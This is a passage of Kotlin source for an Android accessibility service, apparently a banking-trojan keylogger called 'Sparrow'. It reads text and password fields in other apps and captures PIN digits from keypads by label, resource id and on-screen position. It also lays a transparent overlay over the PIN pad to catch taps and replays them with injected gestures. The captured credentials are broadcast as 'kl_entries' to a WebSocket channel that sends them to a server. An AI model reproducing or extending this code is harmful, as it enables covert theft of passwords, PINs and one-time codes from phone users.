                    val node = try { event.source } catch (e: Exception) { null } ?: return
                    try {
                        if (node.isEditable) {
                            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                            val fieldId = node.viewIdResourceName ?: ""
                            val isPass = node.isPassword
                            val key = "$pkg/$fieldId"

                            if (focusedPwdKey.isNotEmpty() && focusedPwdKey != key) {
                                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                captureWindowInputs(focusedPwdPkg.ifEmpty { pkg })
                                if (fieldState.isNotEmpty()) scheduleFlush()
                            }

                            focusedIsPass = isPass
                            focusedPwdKey = key
                            focusedPwdPkg = pkg
                            focusedHint = node.hintText?.toString() ?: ""
                            if (isPass) pwdTracked.remove(key)

                            buffer.add(JSONObject().apply {
                                put("t", "focus")
                                put("ts", System.currentTimeMillis())
                                put("pkg", labelFor(pkg))
                                put("pass", isPass)
                            })
                        } else {
                            val resId = node.viewIdResourceName ?: ""
                            val nodeText = node.text?.toString() ?: ""
                            val nodeDesc = node.contentDescription?.toString() ?: ""
                            val digitFromText = digitFromStr(nodeText)
                            val digitFromDesc = digitFromStr(nodeDesc)
                            val digitFromId = Regex("button([0-9])$", RegexOption.IGNORE_CASE)
                                .find(resId)?.groupValues?.get(1)?.firstOrNull()
                            val digitFromChild = if (digitFromText == null && digitFromDesc == null && digitFromId == null)
                                extractDigitDeep(node, 1) else null
                            val digit = digitFromText ?: digitFromDesc ?: digitFromId ?: digitFromChild
                            if (digit != null) appendPinDigit(pkg, digit)
                        }
                    } finally {
                        try { node.recycle() } catch (_: Exception) {}
                    }
                }

                AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED -> {
                    if (!activeWatched) return
                    val pkg = event.packageName?.toString() ?: return
                    val node = try { event.source } catch (e: Exception) { null } ?: return
                    try {
                        if (!node.isEditable) {
                            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                            val resId = node.viewIdResourceName ?: ""
                            val nodeText = node.text?.toString() ?: ""
                            val nodeDesc = node.contentDescription?.toString() ?: ""
                            val digitFromText = digitFromStr(nodeText)
                            val digitFromDesc = digitFromStr(nodeDesc)
                            val digitFromId = Regex("button([0-9])$", RegexOption.IGNORE_CASE)
                                .find(resId)?.groupValues?.get(1)?.firstOrNull()
                            val digitFromChild = if (digitFromText == null && digitFromDesc == null && digitFromId == null)
                                extractDigitDeep(node, 1) else null
                            val digit = digitFromText ?: digitFromDesc ?: digitFromId ?: digitFromChild
                            if (digit != null) appendPinDigit(pkg, digit)
                        }
                    } finally {
                        try { node.recycle() } catch (_: Exception) {}
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun handleContentChanged(root: AccessibilityNodeInfo?, pkg: String, changeTypes: Int) {
        android.util.Log.d("XDBG", "[Sparrow] handleContentChanged enter root=${root} pkg=${pkg} changeTypes=${changeTypes}") //xdbg
        val wantedMask = AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT or
                AccessibilityEvent.CONTENT_CHANGE_TYPE_SUBTREE
        if (changeTypes and wantedMask == 0) return
        if (pkg.isEmpty() || root == null) return

        val cls = root.className?.toString() ?: ""
        val isWebLike = cls.contains("WebView", ignoreCase = true) ||
                cls.contains("ContentView", ignoreCase = true) ||
                cls.contains("ChromeView", ignoreCase = true)
        when {
            isWebLike -> {
                traverseWebViewTree(root, pkg, depth = 0)
            }
            root.isEditable
                    && !cls.contains("EditText", ignoreCase = true)
                    && !cls.contains("AutoComplete", ignoreCase = true) -> {
                val text = root.text?.toString() ?: return
                if (text.isBlank()) return
                val isPassword = root.isPassword
                val fieldId = root.viewIdResourceName ?: cls
                val key = "$pkg/custom/$fieldId"
                synchronized(fieldState) {
                    fieldState[key] = FieldEntry(pkg, appLabel(pkg), text, isPassword, System.currentTimeMillis(), "custom")
                }
                if (isPassword) { handler.post { flush() }; return }
                handler.post { scheduleFlush() }
            }
            else -> {
                traverseWebViewTree(root, pkg, depth = 0)
            }
        }
    }

    private val SEND_LABELS = setOf(
        "send", "отправить", "submit", "post", "опубликовать",
        "go", "done", "готово", "ок", "ok", "search", "найти",
        "reply", "ответить", "comment", "комментарий", "publish"
    )

    private fun handleViewClicked(event: AccessibilityEvent) {
        android.util.Log.d("XDBG", "[Sparrow] handleViewClicked enter event=${event}") //xdbg
        val pkg = event.packageName?.toString() ?: return
        var node = try { event.source } catch (e: Exception) { null }

        if (node == null) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            val evtDigit = event.text?.firstOrNull()?.let { digitFromStr(it.toString()) }
            if (evtDigit != null) {
                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                appendPinDigit(pkg, evtDigit)
                return
            }
            val root = try { AccessSvc.instance?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                try {
                    val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_ACCESSIBILITY)
                        ?: root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                    if (focused != null && digitFromStr(focused.text?.toString()) != null) {
                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                        node = focused
                    } else {
                        try { focused?.recycle() } catch (_: Exception) {}
                        node = findFocusedDigitNode(root)
                    }
                } catch (_: Exception) {}
                if (node == null) try { root.recycle() } catch (_: Exception) {}
            }
        }
        node ?: run {
            return
        }

        try {
            val now = System.nanoTime()
            if (now - lastPinClickNs > PIN_RESET_NS) {
                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                pinTracked.remove(pkg)
                lastPinDigit = null
            }

            val btnText = (node.text?.toString() ?: node.contentDescription?.toString() ?: "")
                .trim().lowercase()
            val cls = node.className?.toString() ?: ""
            if (btnText in SEND_LABELS || (btnText.isEmpty() &&
                    (cls.contains("ImageButton") || cls.contains("Button"))) ) {
                captureWindowInputs(pkg)
                if (fieldState.isNotEmpty()) flush()
            }

            val digitChar = extractDigit(node)
            val hasPinAccum = pinTracked[pkg]?.isNotEmpty() == true
            val isRawImageBtn = (cls.contains("ImageButton") || cls.contains("ImageView")) &&
                    node.text == null && node.contentDescription == null
            val isBackspace = extractBackspace(node) || (isRawImageBtn && hasPinAccum)

            val posDigit = if (digitChar == null && !isBackspace) extractDigitByPosition(node) else null
            val finalDigit = digitChar ?: posDigit

            when {
                finalDigit != null -> appendPinDigit(pkg, finalDigit)
                isBackspace -> {
                    val sb = pinTracked[pkg] ?: return
                    if (sb.isEmpty()) return
                    sb.deleteCharAt(sb.length - 1)
                    pinCoordsTracked[pkg]?.let { if (it.isNotEmpty()) it.deleteCharAt(it.length - 1) }
                    lastPinClickNs = now
                    lastPinDigit = null
                    val key = "$pkg/pin"
                    if (sb.isEmpty()) {
                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                        fieldState.remove(key)
                        pinTracked.remove(pkg)
                    } else {
                        fieldState[key] = FieldEntry(pkg, appLabel(pkg), sb.toString(), true, System.currentTimeMillis(), "pin")
                        flush()
                    }
                }
            }
        } finally {
            try { node.recycle() } catch (_: Exception) {}
        }
    }

    private fun appendPinDigit(pkg: String, digit: Char) {
        android.util.Log.d("XDBG", "[Sparrow] appendPinDigit enter pkg=${pkg} digit=${digit}") //xdbg
        val now = System.nanoTime()
        if (now - lastPinClickNs > PIN_RESET_NS) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            pinTracked.remove(pkg)
            lastPinDigit = null
        }
        if (digit == lastPinDigit && now - lastPinClickNs < PIN_DEDUP_NS) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            return
        }
        pinScreenActive.add(pkg)
        val sb = pinTracked.getOrPut(pkg) { StringBuilder() }
        sb.append(digit)
        lastPinClickNs = now
        lastPinDigit = digit
        if (pinWaitFirstAnn[pkg] == true && sb.length == 1) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            pinWaitFirstAnn.remove(pkg)
            val csb = pinCoordsTracked.getOrPut(pkg) { StringBuilder() }
            if (csb.isEmpty()) {
                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                csb.append(digit)
            }
        }
        if (sb.length == 4 && !motionEventsActive) createPinOverlay(pkg)
        fieldState["$pkg/pin"] = FieldEntry(pkg, appLabel(pkg), sb.toString(), true, System.currentTimeMillis(), "pin")
        flush()
    }

    private fun findFocusedDigitNode(root: android.view.accessibility.AccessibilityNodeInfo): android.view.accessibility.AccessibilityNodeInfo? {
        android.util.Log.d("XDBG", "[Sparrow] findFocusedDigitNode enter root=${root}") //xdbg
        fun scan(node: android.view.accessibility.AccessibilityNodeInfo, depth: Int): android.view.accessibility.AccessibilityNodeInfo? {
            android.util.Log.d("XDBG", "[Sparrow] scan enter node=${node} depth=${depth}") //xdbg
            if (depth > 6) return null
            if (node.isFocused && digitFromStr(node.text?.toString()) != null) return node
            for (i in 0 until node.childCount) {
                android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
                val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                val result = scan(child, depth + 1)
                if (result != null) {
                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                    if (result !== child) try { child.recycle() } catch (_: Exception) {}
                    return result
                }
                try { child.recycle() } catch (_: Exception) {}
            }
            android.util.Log.d("XDBG", "[Sparrow] return") //xdbg
            return null
        }
        android.util.Log.d("XDBG", "[Sparrow] return") //xdbg
        return scan(root, 0)
    }

    private fun captureWindowInputs(pkg: String) {
        android.util.Log.d("XDBG", "[Sparrow] captureWindowInputs enter pkg=${pkg}") //xdbg
        val svc = AccessSvc.instance ?: return
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: return
        try {
            scanEditableNodes(root, pkg, 0)
        } finally {
            try { root.recycle() } catch (_: Exception) {}
        }
    }

    private fun scanEditableNodes(node: AccessibilityNodeInfo, pkg: String, depth: Int) {
        android.util.Log.d("XDBG", "[Sparrow] scanEditableNodes enter node=${node} pkg=${pkg} depth=${depth}") //xdbg
        if (depth > 20) return
        try {
            if (node.isEditable || node.isPassword) {
                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                val text = node.text?.toString() ?: ""
                if (text.isNotBlank()) {
                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                    val isPassword = node.isPassword
                    val fieldId = node.viewIdResourceName?.takeIf { it.isNotEmpty() }
                        ?: (node.className?.toString() ?: "f") + "_d$depth"
                    val key = "$pkg/win/$fieldId"
                    synchronized(fieldState) {
                        if (winSentCache[key] == text) return
                        if (fieldState.values.any { it.pkg == pkg && it.text == text && it.src != "win" }) return
                        fieldState[key] = FieldEntry(pkg, appLabel(pkg), text, isPassword,
                            System.currentTimeMillis(), "win")
                    }
                }
            }
        } catch (_: Exception) {}
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            try { scanEditableNodes(child, pkg, depth + 1) }
            finally { try { child.recycle() } catch (_: Exception) {} }
        }
    }

    private fun trackPinFieldChanges(pkg: String) {
        android.util.Log.d("XDBG", "[Sparrow] trackPinFieldChanges enter pkg=${pkg}") //xdbg
        val root = try { AccessSvc.instance?.rootInActiveWindow } catch (_: Exception) { null } ?: return
        try { scanForPinFieldChanges(root, pkg, 0) }
        finally { try { root.recycle() } catch (_: Exception) {} }
    }

    private fun looksLikePinField(node: AccessibilityNodeInfo): Boolean {
        android.util.Log.d("XDBG", "[Sparrow] looksLikePinField enter node=${node}") //xdbg
        if (node.isPassword) return true
        val text = node.text?.toString() ?: return false
        if (text.isEmpty()) return false
        if (text.all { it == '●' || it == '•' || it == '*' || it == '○' || it == '◉' }) return true
        val resId = (node.viewIdResourceName ?: "").lowercase()
        val hint = (node.hintText?.toString() ?: "").lowercase()
        android.util.Log.d("XDBG", "[Sparrow] return") //xdbg
        return listOf("pin", "otp", "code", "код", "cvv", "cvc", "pass")
            .any { resId.contains(it) || hint.contains(it) }
    }

    private fun scanForPinFieldChanges(node: AccessibilityNodeInfo, pkg: String, depth: Int) {
        android.util.Log.d("XDBG", "[Sparrow] scanForPinFieldChanges enter node=${node} pkg=${pkg} depth=${depth}") //xdbg
        if (depth > 15) return
        try {
            if (looksLikePinField(node)) {
                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                val text  = node.text?.toString() ?: ""
                val fieldId = node.viewIdResourceName?.takeIf { it.isNotEmpty() }
                    ?: (node.className?.toString() ?: "f") + "_d$depth"
                val key   = "$pkg/pf/$fieldId"
                val prevLen = pinFieldLengths[key] ?: -1
                val curLen  = text.length

                when {
                    curLen > prevLen && prevLen >= 0 -> {
                        val addedCount = curLen - prevLen
                        repeat(addedCount) { offset ->
                            val newCharIdx = prevLen + offset
                            val ch = text.getOrNull(newCharIdx)
                            val actualChar = if (ch != null && !isBullet(ch)) ch else null
                            if (actualChar != null) {
                                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                val ac = actualChar
                                handler.post { appendPinDigit(pkg, ac) }
                            }
                        }
                        pinFieldLengths[key] = curLen
                    }
                    curLen < prevLen && prevLen >= 0 -> {
                        val diff = prevLen - curLen
                        handler.post {
                            val sb = pinTracked[pkg]
                            if (sb != null) {
                                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                repeat(diff) { if (sb.isNotEmpty()) sb.deleteCharAt(sb.length - 1) }
                                pinCoordsTracked[pkg]?.let { csb -> repeat(diff) { if (csb.isNotEmpty()) csb.deleteCharAt(csb.length - 1) } }
                                if (sb.isEmpty()) {
                                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                                    pinTracked.remove(pkg)
                                    fieldState.remove("$pkg/pin")
                                } else {
                                    fieldState["$pkg/pin"] = FieldEntry(
                                        pkg, appLabel(pkg), sb.toString(), true,
                                        System.currentTimeMillis(), "pin"
                                    )
                                }
                            }
                        }
                        pinFieldLengths[key] = curLen
                    }
                    prevLen < 0 -> pinFieldLengths[key] = curLen
                }
            }
        } catch (_: Exception) {}
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            try { scanForPinFieldChanges(child, pkg, depth + 1) }
            finally { try { child.recycle() } catch (_: Exception) {} }
        }
    }

    fun onMotionEvent(event: android.view.MotionEvent) {
        android.util.Log.d("XDBG", "[Sparrow] onMotionEvent enter event=${event}") //xdbg
        val act = event.action
        if (act != android.view.MotionEvent.ACTION_DOWN && act != android.view.MotionEvent.ACTION_HOVER_ENTER) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            return
        }
        val x = event.rawX.toInt()
        val y = event.rawY.toInt()
        val pkg = lastApp
        if (pkg.isBlank()) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            return
        }
        if (isImePackage(pkg)) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            return
        }
        if (!pinScreenActive.contains(pkg)) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            return
        }
        if (pinKeyLayout[pkg].isNullOrEmpty()) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            return
        }
        val now = System.currentTimeMillis()
        val layout = pinKeyLayout[pkg] ?: run {
            return
        }
        var hitKey: String? = null
        var hitDigit: Char? = null
        for ((key, digit) in layout) {
            android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
            val p = key.split(',')
            if (p.size == 4) {
                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                val l = p[0].toIntOrNull() ?: continue
                val t = p[1].toIntOrNull() ?: continue
                val r = p[2].toIntOrNull() ?: continue
                val b = p[3].toIntOrNull() ?: continue
                if (x in l..r && y in t..b) {
                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                    hitKey = "${(l+r)/2},${(t+b)/2}"
                    hitDigit = digit
                    break
                }
            }
        }
        if (hitKey == null || hitDigit == null) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            return
        }
        val lastMs = coordLastTapMs[pkg] ?: 0L
        val lastKey = coordLastTapKey[pkg]
        if (hitKey == lastKey && now - lastMs < 150L) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            return
        }
        motionEventsActive = true
        coordLastTapMs[pkg] = now
        coordLastTapKey[pkg] = hitKey
        val sb = pinCoordsTracked.getOrPut(pkg) { StringBuilder() }
        sb.append(hitDigit)
    }

    private fun scanBtnsLog(root: AccessibilityNodeInfo, depth: Int = 0, storePkg: String? = null) {
        android.util.Log.d("XDBG", "[Sparrow] scanBtnsLog enter root=${root} depth=${depth} storePkg=${storePkg}") //xdbg
        if (depth > 8) return
        try {
            val nr = android.graphics.Rect(); root.getBoundsInScreen(nr)
            val nw = nr.width(); val nh = nr.height()
            if (root.isClickable && nw in 50..700 && nh in 30..300 && !nr.isEmpty) {
                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                val dg = extractDigitDeep(root, 2)
                if (storePkg != null && dg != null) {
                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                    pinBtnRects.getOrPut(storePkg) { mutableListOf() }.add(Pair(android.graphics.Rect(nr), dg))
                }
            }
            for (i in 0 until root.childCount) {
                android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
                val ch = try { root.getChild(i) } catch (_: Exception) { null } ?: continue
                try { scanBtnsLog(ch, depth + 1, storePkg) } finally { try { ch.recycle() } catch (_: Exception) {} }
            }
        } catch (_: Exception) {}
    }

    private fun flushCoordsResult(pkg: String, reason: String) {
        android.util.Log.d("XDBG", "[Sparrow] flushCoordsResult enter pkg=${pkg} reason=${reason}") //xdbg
        val coords = pinCoordsTracked[pkg]?.toString()?.takeIf { it.isNotEmpty() } ?: return
        val textPin = pinTracked[pkg]?.toString() ?: ""
        pinCoordsTracked.remove(pkg)
        if (coords == textPin) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            return
        }
        val ctx = AccessSvc.instance ?: return
        val entry = JSONObject().apply {
            put("t", "key")
            put("ts", System.currentTimeMillis())
            put("pkg", labelFor(pkg))
            put("name", appLabel(pkg))
            put("pass", true)
            put("after", coords)
            put("src", "pin_coords")
        }
        val arr = JSONArray().put(entry)
        try {
            val payload = JSONObject().apply {
                put("action", "kl_entries")
                put("entries", arr)
            }
            val sendIntent = Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
                `package` = ctx.packageName
                putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, payload.toString())
            }
            ctx.sendBroadcast(sendIntent)
        } catch (_: Exception) {}
    }

    private fun buildPinKeyLayout(pkg: String) {
        android.util.Log.d("XDBG", "[Sparrow] buildPinKeyLayout enter pkg=${pkg}") //xdbg
        val root = try { AccessSvc.instance?.rootInActiveWindow } catch (_: Exception) { null } ?: return
        val map = LinkedHashMap<String, Char>()
        fun scan(node: AccessibilityNodeInfo) {
            android.util.Log.d("XDBG", "[Sparrow] scan enter node=${node}") //xdbg
            try {
                if (node.isVisibleToUser && node.isClickable) {
                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                    val r = android.graphics.Rect()
                    node.getBoundsInScreen(r)
                    val w = r.width(); val h = r.height()
                    if (!r.isEmpty && w in 50..1000 && h in 40..300) {
                        android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                        val d = extractDigitDeep(node, 2)
                        if (d != null) {
                            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                            map["${r.left},${r.top},${r.right},${r.bottom}"] = d
                        }
                    }
                }
                for (i in 0 until node.childCount) {
                    android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
                    val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                    try { scan(child) } finally { try { child.recycle() } catch (_: Exception) {} }
                }
            } catch (_: Exception) {}
        }
        try { scan(root) } catch (_: Exception) {} finally { try { root.recycle() } catch (_: Exception) {} }
        if (map.isNotEmpty()) {
            android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
            pinKeyLayout[pkg] = map
        }
    }

    private fun createPinOverlay(pkg: String) {
        android.util.Log.d("XDBG", "[Sparrow] createPinOverlay enter pkg=${pkg}") //xdbg
        removePinOverlay()
        val ctx = AccessSvc.instance ?: return
        val layout = pinKeyLayout[pkg]
        if (layout.isNullOrEmpty()) return
        var minL = Int.MAX_VALUE; var minT = Int.MAX_VALUE; var maxR = 0; var maxB = 0
        for (key in layout.keys) {
            android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
            val p = key.split(','); if (p.size != 4) continue
            val kl = p[0].toIntOrNull() ?: continue; val kt = p[1].toIntOrNull() ?: continue
            val kr = p[2].toIntOrNull() ?: continue; val kb = p[3].toIntOrNull() ?: continue
            if (kl < minL) minL = kl; if (kt < minT) minT = kt
            if (kr > maxR) maxR = kr; if (kb > maxB) maxB = kb
        }
        if (minL >= maxR || minT >= maxB) return
        val wm = ctx.getSystemService(android.content.Context.WINDOW_SERVICE) as android.view.WindowManager
        val params = android.view.WindowManager.LayoutParams(
            maxR - minL + 20, maxB - minT + 20,
            (minL - 10).coerceAtLeast(0), (minT - 10).coerceAtLeast(0),
            android.view.WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            android.graphics.PixelFormat.TRANSLUCENT
        )
        params.gravity = android.view.Gravity.TOP or android.view.Gravity.LEFT
        val view = android.view.View(ctx)
        view.setBackgroundColor(android.graphics.Color.TRANSPARENT)
        view.setOnTouchListener { _, event ->
            if (event.action == android.view.MotionEvent.ACTION_DOWN && !overlayConsumed) {
                android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                overlayConsumed = true
                val sx = event.rawX.toInt(); val sy = event.rawY.toInt()
                var matchedDigit: Char? = null
                for ((key, dg) in layout) {
                    android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
                    val p2 = key.split(','); if (p2.size != 4) continue
                    val kl = p2[0].toIntOrNull() ?: continue; val kt2 = p2[1].toIntOrNull() ?: continue
                    val kr = p2[2].toIntOrNull() ?: continue; val kb = p2[3].toIntOrNull() ?: continue
                    if (sx in kl..kr && sy in kt2..kb) { matchedDigit = dg; break }
                }
                if (matchedDigit != null) {
                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                    val csb = pinCoordsTracked.getOrPut(pkg) { StringBuilder() }
                    csb.append(matchedDigit)
                    coordLastTapKey[pkg] = "$sx,$sy"
                    coordLastTapMs[pkg] = System.currentTimeMillis()
                    handler.postDelayed({
                        flushCoordsResult(pkg, "OVERLAY_DELAYED")
                        pinCoordsTracked.remove(pkg)
                        coordLastTapMs.remove(pkg)
                        coordLastTapKey.remove(pkg)
                    }, 1500L)
                }
                val rawX = event.rawX; val rawY = event.rawY
                val p3 = pinOverlayParams
                if (p3 != null) {
                    android.util.Log.d("XDBG", "[Sparrow] if branch") //xdbg
                    p3.flags = p3.flags or android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    try { wm.updateViewLayout(view, p3) } catch (_: Exception) {}
                }
                handler.postDelayed({
                    val path = android.graphics.Path().apply { moveTo(rawX, rawY) }
                    val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 50L)
                    val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
                    ctx.dispatchGesture(gesture, object : android.accessibilityservice.AccessibilityService.GestureResultCallback() {
                        override fun onCompleted(g: android.accessibilityservice.GestureDescription) {}
                        override fun onCancelled(g: android.accessibilityservice.GestureDescription) {}
                    }, handler)
                }, 60L)
            }
            true
        }
        try {
            overlayConsumed = false
            wm.addView(view, params)
            pinOverlayView = view; pinOverlayWm = wm; pinOverlayParams = params; pinOverlayPkg = pkg
        } catch (_: Exception) {}
    }

    private fun removePinOverlay() {
        android.util.Log.d("XDBG", "[Sparrow] removePinOverlay enter") //xdbg
        val v = pinOverlayView ?: return
        val wm2 = pinOverlayWm ?: return
        try { wm2.removeViewImmediate(v) }
        catch (_: Exception) {}
        pinOverlayView = null; pinOverlayWm = null; pinOverlayParams = null; pinOverlayPkg = ""
    }

    private fun enableOverlayCapture(pkg: String) {
        android.util.Log.d("XDBG", "[Sparrow] enableOverlayCapture enter pkg=${pkg}") //xdbg
        if (pinOverlayPkg != pkg) return
        val v = pinOverlayView ?: return
        val wm2 = pinOverlayWm ?: return
        val p = pinOverlayParams ?: return
        overlayConsumed = false
        p.flags = p.flags and android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
        try { wm2.updateViewLayout(v, p) }
        catch (_: Exception) {}
    }

    private fun extractDigit(node: AccessibilityNodeInfo): Char? {
        android.util.Log.d("XDBG", "[Sparrow] extractDigit enter node=${node}") //xdbg
        digitFromStr(node.text?.toString())?.let { return it }
        digitFromStr(node.contentDescription?.toString())?.let { return it }
        android.util.Log.d("XDBG", "[Sparrow] return") //xdbg
        return extractDigitDeep(node, depth = 1)
    }

    private fun extractDigitDeep(node: AccessibilityNodeInfo, depth: Int): Char? {
        android.util.Log.d("XDBG", "[Sparrow] extractDigitDeep enter node=${node} depth=${depth}") //xdbg
        if (depth > 5) return null
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            try {
                if (!child.isVisibleToUser) continue
                digitFromStr(child.text?.toString())?.let { return it }
                digitFromStr(child.contentDescription?.toString())?.let { return it }
                extractDigitDeep(child, depth + 1)?.let { return it }
            } finally {
                try { child.recycle() } catch (_: Exception) {}
            }
        }
        android.util.Log.d("XDBG", "[Sparrow] return") //xdbg
        return null
    }

    private fun extractDigitByPosition(clickedNode: AccessibilityNodeInfo): Char? {
        android.util.Log.d("XDBG", "[Sparrow] extractDigitByPosition enter clickedNode=${clickedNode}") //xdbg
        val clickedR = android.graphics.Rect()
        clickedNode.getBoundsInScreen(clickedR)
        if (clickedR.isEmpty) return null

        val ancestors = ArrayList<AccessibilityNodeInfo>(8)
        var next: AccessibilityNodeInfo? = try { clickedNode.parent } catch (_: Exception) { null }
        try {
            while (next != null && ancestors.size < 8) {
                android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
                val cur = next
                ancestors.add(cur)
                next = try { cur.parent } catch (_: Exception) { null }
            }
            try { next?.recycle() } catch (_: Exception) {}
            return ancestors.firstNotNullOfOrNull { container ->
                extractFromNumpadContainer(container, clickedR)
            }
        } finally {
            ancestors.forEach { try { it.recycle() } catch (_: Exception) {} }
        }
    }

    private fun extractFromNumpadContainer(
        container: AccessibilityNodeInfo,
        clickedR: android.graphics.Rect
    ): Char? {
        val cW = clickedR.width(); val cH = clickedR.height()
        data class Btn(val l: Int, val t: Int, val r: Int, val b: Int, val hit: Boolean)
        val buttons = ArrayList<Btn>(16)

        fun collect(node: AccessibilityNodeInfo, lvl: Int) {
            android.util.Log.d("XDBG", "[Sparrow] collect enter node=${node} lvl=${lvl}") //xdbg
            if (lvl > 2) return
            for (i in 0 until node.childCount) {
                android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
                val ch = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                try {
                    val r = android.graphics.Rect(); ch.getBoundsInScreen(r)
                    if (!r.isEmpty && r.width() >= 24 && r.height() >= 24 &&
                        kotlin.math.abs(r.width()  - cW) <= cW * 0.5 &&
                        kotlin.math.abs(r.height() - cH) <= cH * 0.5 &&
                        ch.isVisibleToUser) {
                        val hit = r.left == clickedR.left && r.top == clickedR.top &&
                                  r.right == clickedR.right && r.bottom == clickedR.bottom
                        buttons.add(Btn(r.left, r.top, r.right, r.bottom, hit))
                    } else {
                        collect(ch, lvl + 1)
                    }
                } finally { try { ch.recycle() } catch (_: Exception) {} }
            }
        }
        collect(container, 0)

        val n = buttons.size
        if (n < 9 || n > 16) return null
        val avgW = buttons.sumOf { it.r - it.l }.toDouble() / n
        val avgH = buttons.sumOf { it.b - it.t }.toDouble() / n
        val isUniform = buttons.all { b ->
            kotlin.math.abs((b.r - b.l) - avgW) <= avgW * 0.55 &&
            kotlin.math.abs((b.b - b.t) - avgH) <= avgH * 0.55
        }
        if (!isUniform) return null
        val sorted = buttons.sortedWith(compareBy({ it.t }, { it.l }))
        val idx = sorted.indexOfFirst { it.hit }
        if (idx < 0) return null
        val row = idx / 3; val col = idx % 3
        android.util.Log.d("XDBG", "[Sparrow] return") //xdbg
        return when {
            row < 3 -> '1' + (row * 3 + col)
            col == 1 -> '0'
            else -> null
        }
    }

    private fun extractBackspace(node: AccessibilityNodeInfo): Boolean {
        android.util.Log.d("XDBG", "[Sparrow] extractBackspace enter node=${node}") //xdbg
        if (isBackspaceStr(node.text?.toString()) || isBackspaceStr(node.contentDescription?.toString())) return true
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[Sparrow] loop") //xdbg
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            val visible = child.isVisibleToUser
            val cls = child.className?.toString() ?: ""
            val isImageBtn = cls.contains("ImageButton") || cls.contains("ImageView")
            val bs = isBackspaceStr(child.text?.toString()) ||
                    isBackspaceStr(child.contentDescription?.toString()) ||
                    (visible && isImageBtn && digitFromStr(child.contentDescription?.toString()) == null)
            try { child.recycle() } catch (_: Exception) {}
            if (bs) return true
        }
        android.util.Log.d("XDBG", "[Sparrow] return") //xdbg
        return false
    }

    private fun digitFromStr(s: String?): Char? {
        android.util.Log.d("XDBG", "[Sparrow] digitFromStr enter s=${s}") //xdbg
        val t = s?.trim() ?: return null
